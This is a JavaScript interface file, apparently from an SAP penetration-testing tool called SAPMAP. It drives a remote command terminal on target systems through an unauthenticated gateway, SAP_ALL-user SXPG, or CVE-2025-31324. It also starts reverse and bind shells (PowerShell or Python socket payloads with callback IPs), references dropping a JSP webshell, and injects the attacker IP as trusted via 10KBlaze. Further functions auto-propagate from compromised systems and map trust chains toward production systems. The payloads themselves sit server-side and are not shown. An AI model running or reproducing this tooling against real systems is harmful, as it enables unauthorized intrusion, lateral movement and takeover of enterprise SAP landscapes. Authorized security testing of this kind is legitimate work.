      const user = e.dest_user ? escHtml(e.dest_user) : '';
      const host = e.dest_host ? escHtml(e.dest_host) : '';
      const sid = target ? escHtml(target) : '';
      const client = e.client ? '/' + escHtml(e.client) : '';
      const parts = [];
      if (user) parts.push(user);
      if (host) parts.push('@' + host);
      else if (sid) parts.push('@' + sid);
      if (client) parts.push(client);
      belongs = '<span style="color:#f0883e" title="orphan destination — no #~destination.name row; labelled from jco.client.* metadata">'
              + parts.join('') + '</span>';
    } else if (target) {
      belongs = escHtml(target) + (e.client ? '/' + escHtml(e.client) : '');
    }
    rows.push(
      '<tr' + ds + ' title="cid=' + escHtml(e.cid || '-') + '">' +
        '<td style="padding:4px 8px;white-space:nowrap">' + escHtml(source) + '</td>' +
        '<td style="padding:4px 8px;white-space:nowrap">' + escHtml(kind) + '</td>' +
        '<td style="padding:4px 8px;white-space:nowrap">' +
          belongs +
        '</td>' +
        '<td style="padding:4px 8px">' + escHtml(name) + '</td>' +
        '<td style="padding:4px 8px;word-break:break-all">' + escHtml(display) + '</td>' +
        '<td style="padding:4px 8px;text-align:right">' +
          '<button class="btn" style="padding:2px 8px;font-size:10px"' +
          ' onclick=\'copyJssValue(' + JSON.stringify(name) + ')\'>Copy</button>' +
        '</td>' +
      '</tr>'
    );
  }
  if (!rows.length) {
    rows.push('<tr><td colspan="6" style="padding:12px;color:#8b949e;text-align:center">No matching entries.</td></tr>');
  }
  if (hiddenNoise > 0) {
    rows.push('<tr><td colspan="6" style="padding:6px 12px;color:#8b949e;'
              + 'text-align:center;font-style:italic;border-top:1px dashed #30363d">'
              + hiddenNoise + ' noise entries hidden '
              + '(childInstance / data-source-aliases.xml / '
              + 'Secured Property* / undecryptable) — '
              + "tick 'Show noise' above to include them</td></tr>");
  }
  tbody.innerHTML = rows.join('');
}

function copyJssValue(name) {
  const n = (mapState.nodes || {})[_jssCurrentSid];
  if (!n) return;
  const entry = (n.java_secstore_entries || []).find(e => e.name === name);
  if (!entry) return;
  navigator.clipboard.writeText(entry.value || '').then(() => {
    console.log('copied', name);
  });
}

function copyJssJson() {
  const n = (mapState.nodes || {})[_jssCurrentSid];
  if (!n) return;
  navigator.clipboard.writeText(JSON.stringify(n.java_secstore_entries, null, 2));
}

function showTerminalModal(sid) {
  const n = (mapState.nodes || {})[sid];
  document.getElementById('term-sid').textContent = sid;
  // Reset window position to centered
  const twin = document.getElementById('term-window');
  twin.style.top = '50%'; twin.style.left = '50%';
  twin.style.transform = 'translate(-50%, -50%)';
  twin.style.width = '820px'; twin.style.height = '520px';
  const hasGw = n && n.gw_vulnerable;
  const hasCreated = n && (n.created_users || []).length > 0;
  const hasCve = n && n.cve_2025_31324_vulnerable;
  const hasCveShell = n && (n.cve_2025_31324_shells || []).length > 0;
  const sysTypeT = (n && n.system_type || '').toUpperCase();
  const isAbapT = sysTypeT.indexOf('ABAP') !== -1;
  const methodSel = document.getElementById('term-method');
  // Rebuild options from scratch — SXPG is ABAP-only (requires SAP_ALL
  // dialog user), so it is physically absent on pure-Java stacks.
  methodSel.innerHTML = '';
  const addT = (v, label, disabled) => {
    const o = document.createElement('option');
    o.value = v; o.textContent = label; o.disabled = !!disabled;
    methodSel.appendChild(o);
  };
  addT('gateway', 'Gateway (unauthenticated)', !hasGw);
  if (isAbapT) addT('sxpg', 'SXPG (via SAP_ALL user)', !hasCreated);
  addT('cve_31324', 'CVE-2025-31324 (Java unauth)', !hasCve);
  methodSel.value = hasCve ? 'cve_31324'
                           : (hasGw ? 'gateway'
                                    : (isAbapT ? 'sxpg' : 'gateway'));
  // Info text
  let info = [];
  if (hasGw) info.push('Gateway: vulnerable');
  if (hasCreated && isAbapT) info.push('SXPG: user available');
  if (hasCve) {
    info.push(hasCveShell
      ? 'CVE-2025-31324: vulnerable (shell dropped — output captured)'
      : 'CVE-2025-31324: vulnerable (no shell — run "Drop JSP Webshell" for output)');
  }
  document.getElementById('term-info').textContent = info.join(' | ') || 'No execution method available';
  document.getElementById('term-cmdline').value = 'whoami';
  document.getElementById('term-output').textContent = 'Ready. Type a command and press Enter or click Run.\n';
  document.getElementById('terminal-modal').classList.add('visible');
  document.getElementById('term-cmdline').focus();
}

async function termExec() {
  const sid = document.getElementById('term-sid').textContent;
  const method = document.getElementById('term-method').value;
  const cmdline = document.getElementById('term-cmdline').value.trim();
  const out = document.getElementById('term-output');
  if (!cmdline) { alert('Enter a command'); return; }

  out.textContent += `\n$ ${cmdline}\n`;
  out.textContent += '(executing...)\n';
  out.scrollTop = out.scrollHeight;

  try {
    // Send raw cmdline — backend auto-detects OS and wraps in shell
    const res = await api('POST', `node/${sid}/exec_command`, { method, cmdline });
    if (res.error) {
      out.textContent += `ERROR: ${res.error}\n`;
    } else if (res.output && res.output.length) {
      out.textContent += res.output.join('\n') + '\n';
    } else {
      out.textContent += '(no output)\n';
    }
  } catch (e) {
    out.textContent += `ERROR: ${e}\n`;
  }
  out.scrollTop = out.scrollHeight;
  document.getElementById('term-cmdline').value = '';
  document.getElementById('term-cmdline').focus();
}

// --- Reverse Shell ---
let _shellPollId = null;
let _shellSid = '';

async function showShellModal(sid) {
  _shellSid = sid;
  const n = (mapState.nodes || {})[sid];
  document.getElementById('shell-sid').textContent = sid;

  // Reset window position to centered
  const win = document.getElementById('shell-window');
  win.style.top = '50%'; win.style.left = '50%';
  win.style.transform = 'translate(-50%, -50%)';
  win.style.width = '820px'; win.style.height = '520px';

  // Method availability
  const hasGw = n && n.gw_vulnerable;
  const hasCreated = n && (n.created_users || []).length > 0;
  const hasCve = n && n.cve_2025_31324_vulnerable;
  const sysTypeS = (n && n.system_type || '').toUpperCase();
  const isAbapS = sysTypeS.indexOf('ABAP') !== -1;
  const methodSel = document.getElementById('shell-method');
  // Rebuild options from scratch — SXPG is ABAP-only (requires SAP_ALL
  // dialog user), so it is physically absent on pure-Java stacks.
  methodSel.innerHTML = '';
  const addS = (v, label, disabled) => {
    const o = document.createElement('option');
    o.value = v; o.textContent = label; o.disabled = !!disabled;
    methodSel.appendChild(o);
  };
  addS('gateway', 'Gateway (unauthenticated)', !hasGw);
  if (isAbapS) addS('sxpg', 'SXPG (via SAP_ALL user)', !hasCreated);
  addS('cve_31324', 'CVE-2025-31324 (Java unauth)', !hasCve);
  methodSel.value = hasCve ? 'cve_31324'
                           : (hasGw ? 'gateway'
                                    : (isAbapS ? 'sxpg' : 'gateway'));

  let info = [];
  if (hasGw) info.push('Gateway: vulnerable');
  if (hasCreated && isAbapS) info.push('SXPG: user available');
  if (hasCve) info.push('CVE-2025-31324: vulnerable');
  document.getElementById('shell-info').textContent = info.join(' | ');

  // Auto-detect callback IP
  const host = n ? (n.ip || n.hostname) : '';
  const saprouter = n ? (n.saprouter || '') : '';
  document.getElementById('shell-ip').value = 'detecting...';
  const ipRes = await api('GET', `shell/detect_ip?target=${encodeURIComponent(host)}&saprouter=${encodeURIComponent(saprouter)}`);
  document.getElementById('shell-ip').value = ipRes.local_ip || '127.0.0.1';

  // Default to bind mode for SAProuter systems (reverse often blocked)
  const modeSel = document.getElementById('shell-mode');
  modeSel.value = saprouter ? 'bind' : 'reverse';
  shellModeChanged();

  // Payload preview
  const os = (n && n.os_type || '').toLowerCase();
  const isWin = os.includes('windows') || os.includes('nt');
  document.getElementById('shell-payload-preview').textContent =
    isWin ? 'Payload: PowerShell shell (Windows detected)'
          : 'Payload: Python3 socket shell (Linux detected)';

  // Reset UI state
  document.getElementById('shell-config').style.display = '';
  document.getElementById('shell-status-bar').style.display = 'none';
  document.getElementById('shell-terminal').style.display = 'none';
  document.getElementById('shell-terminal').textContent = '';
  document.getElementById('shell-input-bar').style.display = 'none';
  document.getElementById('shell-stop-btn').style.display = 'none';
  document.getElementById('shell-input').disabled = true;
  document.getElementById('shell-send-btn').disabled = true;

  document.getElementById('shell-modal').classList.add('visible');
}

function shellModeChanged() {
  const mode = document.getElementById('shell-mode').value;
  const ipRow = document.getElementById('shell-ip-row');
  if (mode === 'bind') {
    ipRow.style.display = 'none';  // No callback IP needed for bind
  } else {
    ipRow.style.display = '';
  }
}

function shellSetStatus(state, text) {
  const dot = document.getElementById('shell-status-dot');
  const txt = document.getElementById('shell-status-text');
  const colors = {waiting:'#d29922', connected:'#3fb950', disconnected:'#f85149', error:'#f85149'};
  dot.style.background = colors[state] || '#484f58';
  txt.textContent = text;
}

async function shellStart() {
  const sid = _shellSid;
  const method = document.getElementById('shell-method').value;
  const shellMode = document.getElementById('shell-mode').value;
  const localIp = document.getElementById('shell-ip').value.trim();
  const port = parseInt(document.getElementById('shell-port').value) || 4444;

  if (shellMode === 'reverse' && !localIp) { alert('Callback IP is required'); return; }

  const res = await api('POST', 'shell/start', {
    sid, method, shell_mode: shellMode, listen_port: port, local_ip: localIp
  });
  if (res.error) { alert(res.error); return; }

  // Switch to shell view
  document.getElementById('shell-config').style.display = 'none';
  document.getElementById('shell-status-bar').style.display = '';
  document.getElementById('shell-terminal').style.display = '';
  document.getElementById('shell-input-bar').style.display = 'flex';
  document.getElementById('shell-stop-btn').style.display = '';
  if (shellMode === 'bind') {
    shellSetStatus('waiting', `Sending bind shell payload — will connect to ${sid}:${port}...`);
    document.getElementById('shell-terminal').textContent =
      `[*] Bind shell payload sent to ${sid}\n[*] Waiting for bind shell to start, then connecting to port ${port}...\n`;
  } else {
    shellSetStatus('waiting', `Listening on 0.0.0.0:${port} — waiting for connection...`);
    document.getElementById('shell-terminal').textContent =
      `[*] Reverse shell listener started on port ${port}\n[*] Payload sent to ${sid} — waiting for callback...\n`;
  }

  // Start polling
  shellStartPolling();
}

function shellStartPolling() {
  if (_shellPollId) clearInterval(_shellPollId);
  _shellPollId = setInterval(async () => {
    // Poll status
    const st = await api('GET', 'shell/status');
    if (!st.active) {
      shellSetStatus('disconnected', 'Session ended');
      shellStopPolling();
      return;
    }
    if (st.status === 'connected') {
      if (document.getElementById('shell-input').disabled) {
        shellSetStatus('connected', `Connected from ${st.client_addr}`);
        const term = document.getElementById('shell-terminal');
        term.textContent += `[+] Connected to ${st.client_addr}\n`;
        term.scrollTop = term.scrollHeight;
        document.getElementById('shell-input').disabled = false;
        document.getElementById('shell-send-btn').disabled = false;
        document.getElementById('shell-input').focus();
      }
    } else if (st.status === 'error') {
      shellSetStatus('error', st.error || 'Error');
      shellStopPolling();
      return;
    } else if (st.status === 'disconnected') {
      shellSetStatus('disconnected', 'Shell disconnected');
      document.getElementById('shell-input').disabled = true;
      document.getElementById('shell-send-btn').disabled = true;
      shellStopPolling();
      return;
    } else if (st.status === 'waiting' && st.progress) {
      shellSetStatus('waiting', st.progress);
    }

    // Poll output
    const out = await api('GET', 'shell/output');
    if (out.output) {
      const term = document.getElementById('shell-terminal');
      term.textContent += out.output;
      term.scrollTop = term.scrollHeight;
    }
  }, 200);
}

function shellStopPolling() {
  if (_shellPollId) { clearInterval(_shellPollId); _shellPollId = null; }
}

async function shellSendInput() {
  const input = document.getElementById('shell-input');
  const text = input.value;
  if (!text) return;
  input.value = '';
  await api('POST', 'shell/input', { text });
}

async function shellStop() {
  shellStopPolling();
  await api('POST', 'shell/stop');
  shellSetStatus('disconnected', 'Stopped');
  document.getElementById('shell-input').disabled = true;
  document.getElementById('shell-send-btn').disabled = true;
  // Re-show config for potential restart
  document.getElementById('shell-config').style.display = '';
}

function shellClose() {
  shellStop();
  closeModal('shell-modal');
}

// --- Draggable/resizable window helper ---
function makeDraggableResizable(winId, barId, handleId) {
  const win = document.getElementById(winId);
  const bar = document.getElementById(barId);
  const handle = document.getElementById(handleId);
  let dragging = false, resizing = false, dx, dy, startW, startH, startX, startY;

  function snapToAbsolute() {
    const r = win.getBoundingClientRect();
    if (win.style.transform && win.style.transform !== 'none') {
      win.style.top = r.top + 'px';
      win.style.left = r.left + 'px';
      win.style.transform = 'none';
    }
    return r;
  }

  bar.addEventListener('mousedown', e => {
    if (e.target.closest('button,input,select')) return;
    dragging = true;
    const r = snapToAbsolute();
    dx = e.clientX - r.left;
    dy = e.clientY - r.top;
    e.preventDefault();
  });

  handle.addEventListener('mousedown', e => {
    resizing = true;
    const r = snapToAbsolute();
    startW = r.width; startH = r.height;
    startX = e.clientX; startY = e.clientY;
    e.preventDefault();
  });

  document.addEventListener('mousemove', e => {
    if (dragging) {
      win.style.left = Math.max(0, e.clientX - dx) + 'px';
      win.style.top = Math.max(0, e.clientY - dy) + 'px';
    } else if (resizing) {
      win.style.width = Math.max(400, startW + e.clientX - startX) + 'px';
      win.style.height = Math.max(300, startH + e.clientY - startY) + 'px';
    }
  });

  document.addEventListener('mouseup', () => { dragging = false; resizing = false; });
}
makeDraggableResizable('shell-window', 'shell-titlebar', 'shell-resize-handle');
makeDraggableResizable('jss-window', 'jss-titlebar', 'jss-resize-handle');
makeDraggableResizable('term-window', 'term-titlebar', 'term-resize-handle');

// --- Global actions ---
async function propagateAll() {
  if (confirm('Auto-propagate from all pwned systems?'))
    await api('POST', 'actions/propagate_all');
  startPolling();
}
async function cleanupAll() {
  if (confirm('Delete ALL SAPMAP-created users across ALL systems?'))
    await api('POST', 'actions/cleanup_all');
  startPolling();
}
async function checkAllGateways() {
  const nodeCount = Object.keys(mapState.nodes || {}).length;
  if (nodeCount < 1) { alert('No systems on the map.'); return; }
  if (confirm(`Check RFC gateway vulnerability on all ${nodeCount} system(s) on the map?`))
    await api('POST', 'actions/check_all_gw');
  startPolling();
}
async function scanAllVulns() {
  const nodeCount = Object.keys(mapState.nodes || {}).length;
  if (nodeCount < 1) { alert('No systems on the map.'); return; }
  if (confirm(`Scan for ALL vulnerabilities on ${nodeCount} system(s)?\n\n` +
              `Runs every passive 'Check ...' probe per node:\n` +
              ` • GW Vulnerability (every SAP)\n` +
              ` • MS Betrusted / CVE-2020-6207 (every SAP)\n` +
              ` • CVE-2025-31324 VisualComposer (Java only)\n` +
              ` • CVE-2020-6287 RECON (Java only)\n` +
              ` • SAProuter Info Leak (SAProuter nodes)\n\n` +
              `Excluded: Deep/SAPology scan, Default Accounts (may lock), RFC retrieval.\n\n` +
              `Press STOP to cancel mid-sweep.`))
    await api('POST', 'actions/check_all_vulns');
  startPolling();
}
async function checkAllBetrusted() {
  const nodeCount = Object.keys(mapState.nodes || {}).length;
  if (nodeCount < 1) { alert('No systems on the map.'); return; }
  if (confirm(`Check 10KBlaze (MS betrusted) vulnerability on all ${nodeCount} systems?\n\n` +
              `This will:\n` +
              `1. Scan for unprotected MS internal ports (39XX)\n` +
              `2. On vulnerable systems, inject our IP as trusted\n\n` +
              `Systems with gw/reg_no_conn_info=0 will become exploitable.`))
    await api('POST', 'actions/check_all_betrusted', { attacker_ip: localIp });
  startPolling();
}
async function analyzeChains() {
  const nodeCount = Object.keys(mapState.nodes || {}).length;
  if (nodeCount < 2) { alert('Need at least 2 systems on the map with RFC connections.'); return; }
  await api('POST', 'actions/analyze_chains');
  // Poll for results then show them
  setTimeout(async () => {
    const r = await fetch('/api/chains');
    const data = await r.json();
    const chains = data.chains || [];
    if (chains.length === 0) {
      // Keep polling a bit
      setTimeout(async () => {
        const r2 = await fetch('/api/chains');
        const d2 = await r2.json();
        showChainResults(d2.chains || []);
      }, 3000);
    } else {
      showChainResults(chains);
    }
  }, 2000);
  startPolling();
}

function showChainResults(chains) {
  const panel = document.getElementById('detail-panel');
  const sevColors = { 5:'#e74c3c', 4:'#e67e22', 3:'#f1c40f', 2:'#3498db', 1:'#95a5a6' };

  if (chains.length === 0) {
    panel.innerHTML = `
      <span class="close-btn" onclick="this.parentElement.classList.remove('visible')">&times;</span>
      <h3>&#128279; Trust Chain Analysis</h3>
      <div style="color:#8b949e;padding:12px">
        No exploitable attack chains found.<br><br>
        This means either:<br>
        &bull; No systems are compromised/exploitable yet<br>
        &bull; RFC connections haven't been retrieved<br>
        &bull; No RFC links have successful logon with SAP_ALL<br><br>
        Try: Retrieve RFC connections first, then run the analysis.
      </div>`;
    panel.classList.add('visible');
    return;
  }

  const prodChains = chains.filter(c => c.end_is_production);

  panel.innerHTML = `
    <span class="close-btn" onclick="this.parentElement.classList.remove('visible')">&times;</span>
    <h3>&#128279; Trust Chain Analysis (${chains.length} paths${prodChains.length ? ', ' + prodChains.length + ' reach production' : ''})</h3>
    ${chains.map((c, idx) => {
      const col = sevColors[c.severity] || '#95a5a6';
      const pathSids = c.path_sids || [];
      const arrow = ' &#8594; ';

      return '<div class="detail-section" style="border-left:3px solid ' + col + ';padding-left:10px;margin-bottom:14px;cursor:pointer" ' +
        "onclick='highlightChain(" + JSON.stringify(pathSids) + ")'>" +
        '<div style="display:flex;justify-content:space-between;align-items:center">' +
          '<h4 style="margin:0;font-size:13px">&#128279; ' + escHtml(c.headline) + '</h4>' +
          '<span style="font-size:10px;padding:2px 6px;border-radius:3px;background:' + col + ';color:#fff;font-weight:bold">' + escHtml(c.risk_label) + '</span>' +
        '</div>' +
        '<div style="margin:6px 0;font-size:12px">' +
          '<span style="font-family:monospace;background:#21262d;padding:3px 8px;border-radius:4px;display:inline-block">' +
            pathSids.map((s,i) => '<span style="color:' + (i === 0 ? '#f0883e' : i === pathSids.length-1 ? (c.end_is_production ? '#e74c3c' : '#58a6ff') : '#c9d1d9') + '">' + escHtml(s) + '</span>').join(arrow) +
          '</span>' +
        '</div>' +
        (c.hops || []).map((h, hi) =>
          '<div style="font-size:11px;color:#8b949e;margin:2px 0;padding-left:' + (hi * 8 + 4) + 'px">' +
            '&#9654; ' + escHtml(h.source_sid) + ' &#8594; ' + escHtml(h.target_sid) +
            (h.destination_name ? ' via <span style="color:#58a6ff">' + escHtml(h.destination_name) + '</span>' : '') +
            (h.rfc_user ? ' (user: ' + escHtml(h.rfc_user) + ')' : '') +
            (h.has_sap_all ? ' <span style="color:#e74c3c;font-weight:bold">SAP_ALL</span>' : '') +
          '</div>'
        ).join('') +
        '<div style="font-size:11px;color:#8b949e;margin-top:4px">' +
          'Entry: ' + escHtml(c.entry_method || 'unknown') +
          (c.end_is_production ? ' &mdash; <span style="color:#e74c3c;font-weight:bold">PRODUCTION reached</span>' : '') +
        '</div>' +
        (c.business_impact ? '<div style="font-size:12px;color:#c9d1d9;margin-top:4px;font-style:italic">&ldquo;' + escHtml(c.business_impact) + '&rdquo;</div>' : '') +
        '<div style="font-size:10px;color:#58a6ff;margin-top:4px">Click to highlight on map</div>' +
      '</div>';
    }).join('')}
  `;
  panel.classList.add('visible');
}

let _highlightedChain = null;
function highlightChain(pathSids) {
  _highlightedChain = pathSids;
  updateMap();
  // Auto-clear after 15 seconds
  setTimeout(() => { _highlightedChain = null; updateMap(); }, 15000);
}

async function testAllRFCs() {
  const nodes = mapState.nodes || {};
  const conns = mapState.connections || [];
  const sources = Object.keys(nodes).filter(sid => {
    const n = nodes[sid];
    const hasCreds = ((n.credentials || []).length > 0)
                     || ((n.created_users || []).length > 0)
                     || n.pwned;
    const hasRFCs = conns.some(c => c.source_sid === sid);
    return hasCreds && hasRFCs;
  });
  if (sources.length === 0) {
    alert('No systems on the map have both credentials and RFC destinations to test.');
    return;
  }
  if (!confirm('Test RFC destinations on ' + sources.length + ' system(s): '
               + sources.join(', ') + '?\n\n'
               + '⚠ Warning: if a destination holds a wrong password for a '
               + 'real user, this may lock that user on the target system.')) return;
  for (const sid of sources) {
    await api('POST', `node/${sid}/test_rfcs`);
  }
}
async function showCreatedUsers() {
  const res = await api('GET', 'actions/created_users');
  const users = res.users || [];
  alert(users.length === 0 ? 'No users created yet.' :
    users.map(u => `${u.username} @ ${u.sid} (${u.method})`).join('\n'));
}

async function showCreatedDestinations() {
  const res = await api('GET', 'actions/created_destinations');
  const dests = res.destinations || [];
  if (dests.length === 0) { alert('No TCP/IP destinations created yet.'); return; }
  const lines = dests.map(d => {
    const ts = d.created_at ? d.created_at.replace('T', ' ').substring(0, 19) : '?';
    return `${d.dest_name}  on ${d.source_sid} → ${d.target_sid} (${d.target_host}:${d.gw_port})  [${ts}]`;
  });
  alert(`Created TCP/IP Destinations (${dests.length}):\n\n` + lines.join('\n'));
}

async function clearCreatedDestinations() {
  if (confirm('Clear the list of created TCP/IP destinations? This only clears the tracking list, not the actual destinations on the SAP systems.'))
    await api('POST', 'actions/clear_created_destinations');
}

// --- Save/Load ---
async function saveState() {
  const d = new Date();
  const ts = d.getFullYear() + ('0'+(d.getMonth()+1)).slice(-2) + ('0'+d.getDate()).slice(-2) + '_' + ('0'+d.getHours()).slice(-2) + ('0'+d.getMinutes()).slice(-2) + ('0'+d.getSeconds()).slice(-2);
  const name = prompt('Save state as:', 'sapmap_' + ts);
  if (!name) return;
  await api('POST', 'state/save', { name });
}
function loadState() {
  document.getElementById('file-picker').click();
}
function handleFileLoad(input) {
  const file = input.files[0];
  if (!file) return;
  input.value = '';
  const reader = new FileReader();
  reader.onload = async function(e) {
    try {
      const data = JSON.parse(e.target.result);
      const res = await api('POST', 'state/upload', data);
      if (res.error) alert('Load failed: ' + res.error);
      // Reset cursors + dismissal state so the restored findings snapshot
      // reappears in the banner/drawer/bell on the next poll.
      findingsCursor = 0;
      _activeFindings = [];
      _dismissedFindingIds = new Set();
      _bannerHiddenIds = new Set();
      renderFindings();
    } catch (err) {
      alert('Invalid file: ' + err.message);
    }
    startPolling();
  };
  reader.readAsText(file);
}
async function exportJSON() {
  window.open('/api/export/json', '_blank');
}

async function exportReport() {
  // Engagement-style Markdown report.  We do NOT trigger a browser
  // download — pywebview's embedded Chromium navigates the main
  // window away when handed a blob/data response, replacing the map
  // with the raw report content.  The endpoint writes the file
  // server-side and returns JSON with the path, which we surface in
  // a toast so the operator can open it externally.
  showToast(
    '<strong>📝 Generating engagement report…</strong>'
      + '<div style="color:#8b949e;font-size:11px;margin-top:4px">'
      + 'Walking landscape state — saving to loot/reports/</div>',
    {autoCloseMs: 4000}
  );
  try {
    const r = await fetch('/api/export/report');
    const j = await r.json();
    if (!j.ok) {
      showToast('Report export failed: ' + (j.error || 'unknown'),
                {autoCloseMs: 8000});
      return;
    }
    showToast(
      '<strong style="color:#3fb950">📝 Engagement reports saved</strong>'
        + '<div style="color:#c9d1d9;font-size:11px;margin-top:6px;'
        + 'font-family:monospace;word-break:break-all">'
        + '<b>HTML</b> (presentable):<br>' + escHtml(j.html_path) + '</div>'
        + '<div style="color:#c9d1d9;font-size:11px;margin-top:6px;'
        + 'font-family:monospace;word-break:break-all">'
        + '<b>Markdown</b> (raw):<br>' + escHtml(j.md_path) + '</div>'
        + '<div style="color:#8b949e;font-size:10px;margin-top:6px">'
        + 'Open the HTML file in any browser → looks great, prints to PDF.</div>',
      {autoCloseMs: 18000}
    );
    console.log('[*] Reports saved: ' + j.html_path + ' + ' + j.md_path);
  } catch (e) {
    showToast('Report export error: ' + e, {autoCloseMs: 8000});
    console.error('[exportReport]', e);
  }
}

// --- View controls ---
function zoomIn() { viewBoxUserControlled = true; viewBox.w *= 0.8; viewBox.h *= 0.8; applyViewBox(); }
function zoomOut() { viewBoxUserControlled = true; viewBox.w *= 1.25; viewBox.h *= 1.25; applyViewBox(); }
function fitMap() { viewBoxUserControlled = false; viewBox.x = 0; viewBox.y = 0; viewBox.w = 1200; viewBox.h = 800; viewBox._nodeCount = 0; applyViewBox(); updateMap(); }
function _hasSccOnSameHost(n) {
  // Returns true when an SCCNode shares the same IP as SAP node n.
  if (!n) return false;
  const IP_RE = /^\d{1,3}(\.\d{1,3}){3}$/;
  const nip = (n.ip && IP_RE.test(n.ip)) ? n.ip :
              (n.hostname && IP_RE.test(n.hostname||'')) ? n.hostname : '';
  if (!nip) return false;
  return Object.values(mapState.scc_nodes || {}).some(sn => {
    const snip = (sn.ip && IP_RE.test(sn.ip)) ? sn.ip :
                 (sn.host && IP_RE.test(sn.host||'')) ? sn.host : '';
    return snip === nip;
  });
}

function _sccHostForNode(n) {
  // Returns the host key of the SCCNode on the same IP as SAP node n.
  if (!n) return null;
  const IP_RE = /^\d{1,3}(\.\d{1,3}){3}$/;
  const nip = (n.ip && IP_RE.test(n.ip)) ? n.ip :
              (n.hostname && IP_RE.test(n.hostname||'')) ? n.hostname : '';
  if (!nip) return null;
  for (const [host, sn] of Object.entries(mapState.scc_nodes || {})) {
    const snip = (sn.ip && IP_RE.test(sn.ip)) ? sn.ip :
                 (sn.host && IP_RE.test(sn.host||'')) ? sn.host : '';
    if (snip === nip) return host;
  }
  return null;
}
function resetLayout() {
  flashActivity('Rearranging: Reset');
  viewBoxUserControlled = false;
  viewBox.x = 0; viewBox.y = 0; viewBox._nodeCount = 0;
  Object.values(mapState.nodes || {}).forEach(n => { n._x = null; n._y = null; });
  Object.values(mapState.scc_nodes || {}).forEach(sn => { sn._x = null; sn._y = null; });
  Object.values(mapState.btp_subaccounts || {}).forEach(bn => { bn._x = null; bn._y = null; });
  updateMap();
}

// ---------------------------------------------------------------------------
// Alternative layouts.  All operate on mapState.nodes by setting
// n._x / n._y (top-left corner of each node box) and then trigger
// fitMap() so the new layout fills the viewport.  Box dimensions
// duplicated from updateMap()'s constants — keep in sync.
// ---------------------------------------------------------------------------
const _LO_BOX_W = 240, _LO_BOX_H = 174, _LO_MARGIN = 60;

function _loCenter(n, cx, cy) {
  // Place node so its CENTER lands at (cx, cy).
  n._x = cx - _LO_BOX_W / 2;
  n._y = cy - _LO_BOX_H / 2;
}

function _loSortedNodeKeys() {
  const nodes = mapState.nodes || {};
  return Object.keys(nodes).sort();
}

// Place BTP subaccount nodes in a horizontal strip starting at
// (xStart, yStart) and return the vertical space they consumed
// (0 when there are none).  Every alternative layout calls this
// first so the cloud tier never collides with on-prem clusters.
function _loPlaceBtpTier(xStart, yStart) {
  const btp = mapState.btp_subaccounts || {};
  const uuids = Object.keys(btp).sort();
  if (!uuids.length) return 0;
  uuids.forEach((u, i) => {
    const obj = btp[u];
    if (!obj) return;
    obj._x = xStart + i * (_LO_BOX_W + _LO_MARGIN);
    obj._y = yStart;
  });
  return _LO_BOX_H + _LO_MARGIN * 2;
}

function layoutCircle() {
  const sids = _loSortedNodeKeys();
  const sccHosts = Object.keys(mapState.scc_nodes || {}).sort();
  const allItems = [
    ...sids.map(id => ({ id, obj: (mapState.nodes||{})[id] })),
    ...sccHosts.map(h => ({ id: h, obj: (mapState.scc_nodes||{})[h] })),
  ];
  if (allItems.length === 0) return;
  flashActivity('Rearranging: Circle');
  // Radius scales with total node count so boxes never overlap on the ring.
  const total = allItems.length;
  const circ = total * (_LO_BOX_W + _LO_MARGIN);
  const r = Math.max(360, circ / (2 * Math.PI));
  // BTP cloud tier sits above the ring so it doesn't overlap centre / spokes.
  const btpTier = _loPlaceBtpTier(_LO_MARGIN, _LO_MARGIN);
  const cx = r + _LO_BOX_W;
  const cy = btpTier + r + _LO_BOX_H;
  allItems.forEach(({obj}, i) => {
    const angle = (2 * Math.PI * i) / total - Math.PI / 2;
    _loCenter(obj, cx + r * Math.cos(angle), cy + r * Math.sin(angle));
  });
  fitMap();
  updateMap();
}

function layoutStar() {
  // Hub-and-spoke: most-connected SAP node at centre, everything else on ring.
  const sids = _loSortedNodeKeys();
  const sccHosts = Object.keys(mapState.scc_nodes || {}).sort();
  if (sids.length === 0 && sccHosts.length === 0) return;
  flashActivity('Rearranging: Star');
  const nodes = mapState.nodes || {};
  const conns = mapState.connections || [];
  const deg = {};
  sids.forEach(s => { deg[s] = 0; });
  conns.forEach(c => {
    if (deg[c.source_sid] != null) deg[c.source_sid]++;
    if (deg[c.target_sid] != null) deg[c.target_sid]++;
  });
  let hub = sids[0];
  sids.forEach(s => {
    if (!hub || deg[s] > deg[hub] || (deg[s] === deg[hub] && s < hub)) hub = s;
  });
  const spokes = [
    ...sids.filter(s => s !== hub).map(id => ({ obj: nodes[id] })),
    ...sccHosts.map(h => ({ obj: (mapState.scc_nodes||{})[h] })),
  ];
  const r = Math.max(360, spokes.length * (_LO_BOX_W + _LO_MARGIN) / (2 * Math.PI));
  // BTP cloud tier sits above the hub-and-spoke pattern.
  const btpTier = _loPlaceBtpTier(_LO_MARGIN, _LO_MARGIN);
  const cx = r + _LO_BOX_W;
  const cy = btpTier + r + _LO_BOX_H;
  if (hub) _loCenter(nodes[hub], cx, cy);
  spokes.forEach(({obj}, i) => {
    const angle = (2 * Math.PI * i) / spokes.length - Math.PI / 2;
    _loCenter(obj, cx + r * Math.cos(angle), cy + r * Math.sin(angle));
  });
  fitMap();
  updateMap();
}

function layoutHierarchy() {
  // Layered top-down by RFC edge direction.  Sources of edges go on
  // upper layers, targets below.  Uses a BFS pass: nodes with no
  // incoming edges land on layer 0; everyone else gets max(layer of
  // any source) + 1.  Cycles are broken by the BFS order so the
  // result is always a valid layered DAG even on cyclic landscapes.
  const sids = _loSortedNodeKeys();
  if (sids.length === 0) return;
  flashActivity('Rearranging: Hierarchy');
  const nodes = mapState.nodes;
  const conns = mapState.connections || [];
  // Build incoming edge map (target -> [source])
  const incoming = {};
  sids.forEach(s => { incoming[s] = new Set(); });
  conns.forEach(c => {
    if (c.source_sid && c.target_sid && c.source_sid !== c.target_sid
        && incoming[c.target_sid] != null) {
      incoming[c.target_sid].add(c.source_sid);
    }
  });
  // Iteratively assign layer = max(layer(src)+1).  Cap at 12 passes
  // so cycles don't loop forever.
  const layer = {};
  sids.forEach(s => { layer[s] = 0; });
  for (let pass = 0; pass < 12; pass++) {
    let changed = false;
    sids.forEach(s => {
      let max_src = -1;
      incoming[s].forEach(src => {
        if (layer[src] > max_src) max_src = layer[src];
      });
      if (max_src + 1 > layer[s] && max_src >= 0) {
        layer[s] = max_src + 1;
        changed = true;
      }
    });
    if (!changed) break;
  }
  // Bucket sids by layer
  const buckets = {};
  sids.forEach(s => {
    (buckets[layer[s]] = buckets[layer[s]] || []).push(s);
  });
  const layerKeys = Object.keys(buckets).map(Number).sort((a,b)=>a-b);
  // Place each layer as a horizontal row, centred on x.
